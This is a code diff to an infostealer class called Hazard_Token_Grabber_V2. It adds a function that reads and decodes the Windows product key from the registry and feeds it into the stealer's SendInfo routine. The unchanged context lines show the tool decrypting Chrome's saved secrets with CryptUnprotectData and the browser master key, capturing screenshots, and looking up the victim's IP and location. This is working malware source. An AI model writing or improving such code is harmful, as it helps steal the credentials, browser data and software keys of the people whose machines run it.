@@ -6,7 +6,7 @@ import zipfile
 import json
 import base64 
 import psutil
-import subprocess
+import winreg
 
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
@@ -147,6 +147,33 @@ class Hazard_Token_Grabber_V2:
         with open(bd, 'w'): pass
         with open(bd, "wt", encoding="cp437") as f:
             f.write(content2)
+
+    def getProductKey(self, path: str = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+        def strToInt(x):
+            if isinstance(x, str):
+                return ord(x)
+            return x
+        chars = 'BCDFGHJKMPQRTVWXY2346789'
+        result = ''
+        offset = 52
+        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(reg, 'DigitalProductID')
+        key = list(val)
+    
+        for i in range(24,-1, -1):
+            temp = 0
+            for j in range(14,-1,-1):
+                temp *= 256
+                temp += strToInt(key[j+ offset])
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
+                temp = int(temp % 24)
+            result = chars[temp] + result
+        for i in range(5,len(result),6):
+            result = result[:i] + '-' + result[i:]
+        return result
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
@@ -354,8 +381,7 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
-        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
+        wkey = self.getProductKey()
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
